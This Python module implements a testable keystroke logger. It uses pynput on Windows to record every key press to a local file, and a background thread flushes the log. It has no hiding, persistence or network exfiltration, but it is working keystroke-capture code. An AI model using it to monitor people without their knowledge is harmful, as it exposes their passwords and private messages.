"""Testable event handler; importing this module never hooks the keyboard."""

import math
import sys
from threading import Event, RLock, Thread

from src.log_handler import LogHandler


def windows_listener_factory(**kwargs):
    if sys.platform != "win32":
        raise RuntimeError("Live keyboard capture requires Windows 10 or 11.")
    from pynput import keyboard

    return keyboard.Listener(**kwargs)


class Keylogger:
    """Single-use capture session. Call stop() or use a context manager.

    Unit tests inject a listener factory and may call on_press directly.
    Only an explicit start() enables a live listener.
    """

    def __init__(self, log_path: str, flush_interval: float = 5, *,
                 listener_factory=None):
        if not math.isfinite(flush_interval) or flush_interval <= 0:
            raise ValueError("flush_interval must be positive and finite")
        self.log_path = log_path
        self.flush_interval = flush_interval
        self.handler = LogHandler(log_path)
        self.listener = None
        self._listener_factory = listener_factory or windows_listener_factory
        self._buffer = []
        self._running = False
        self._closed = False
        self._lock = RLock()
        self._stop_event = Event()
        self._worker = None
        self._flush_error = None

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            name = getattr(key, "name", None)
            char = f"[{name}]" if isinstance(name, str) and name else None
        if not isinstance(char, str) or not char:
            return
        with self._lock:
            if not self._closed:
                self.handler.write(char)
                self._buffer.append(char)

    def _flush_loop(self):
        while not self._stop_event.wait(self.flush_interval):
            try:
                self.handler.flush()
            except Exception as exc:
                self._flush_error = exc
                return

    def start(self):
        if self._closed:
            raise RuntimeError("Session is closed; create a new Keylogger.")
        if self._running:
            return
        try:
            self.listener = self._listener_factory(on_press=self.on_press)
            self.listener.start()
            self._worker = Thread(target=self._flush_loop, daemon=True)
            self._worker.start()
            self._running = True
        except Exception:
            self.stop()
            raise

    def stop(self):
        # Reject late callbacks before closing the file.
        with self._lock:
            self._closed = True
            self._running = False
        self._stop_event.set()
        listener, self.listener = self.listener, None
        try:
            if listener is not None:
                listener.stop()
                if listener.ident is not None:
                    listener.join()
        finally:
            try:
                if self._worker is not None and self._worker.ident is not None:
                    self._worker.join()
            finally:
                self.handler.close()  # close also flushes buffered text
        if self._flush_error is not None:
            raise RuntimeError("Periodic log flush failed") from self._flush_error

    def get_buffer(self):
        with self._lock:
            return list(self._buffer)

    def clear_buffer(self):
        with self._lock:
            self._buffer.clear()

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.stop()
